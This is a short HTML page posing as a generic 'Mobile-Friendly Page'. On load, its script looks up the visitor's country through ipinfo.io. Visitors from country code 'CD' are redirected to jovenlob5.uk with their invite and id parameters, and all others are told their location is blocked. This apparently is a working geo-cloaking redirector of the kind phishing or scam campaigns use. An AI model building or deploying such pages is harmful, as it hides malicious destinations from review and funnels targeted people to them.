<!DOCTYPE html>
  <html>
	<head>
	  <title>Mobile-Friendly Page</title>
<style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
    }
    
    #loading {
      display: none;
    }
</style>
	</head>
	<body>
	  <h1>Welcome to My Page!</h1>
	  <div id="loading">
		<h2>Loading...</h2>
	  </div>

<script>
    // Function to retrieve query parameters from the URL
    function getQueryParameter(name) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name);
    }

    // Function to redirect to a different URL
    function redirectTo(url) {
      window.location.href = url;
    }

    // Function to handle the logic based on the client's IP
    function handleIP(clientIP) {
      const invite = getQueryParameter('invite');
      const id = getQueryParameter('id');

      if (clientIP === 'CD') {
        const redirectURL = `https://jovenlob5.uk?invite=${invite}&id=${id}`;
        redirectTo(redirectURL);
      } else {
        const blockedMessage = document.createElement('p');
        blockedMessage.textContent = 'Your location is blocked.';
        document.body.appendChild(blockedMessage);
      }

      // Hide the loading message
      const loadingDiv = document.getElementById('loading');
      loadingDiv.style.display = 'none';
    }

    // Function to make a GET request to retrieve the client's IP
    
	function getClientIP()
	{ 
		const url = 'https://ipinfo.io/'; fetch(url) .then(response => { if (response.ok) { return response.json(); } else { throw new Error('Failed to retrieve client IP'); } }) .then(data => { const clientIP = data.country; handleIP(clientIP); }) .catch(error => { alert(error); }); } 
	

    // Show the loading message
    const loadingDiv = document.getElementById('loading');
    loadingDiv.style.display = 'block';

    // Call the function to retrieve the client's IP
    getClientIP();
</script>
	</body>
  </html>


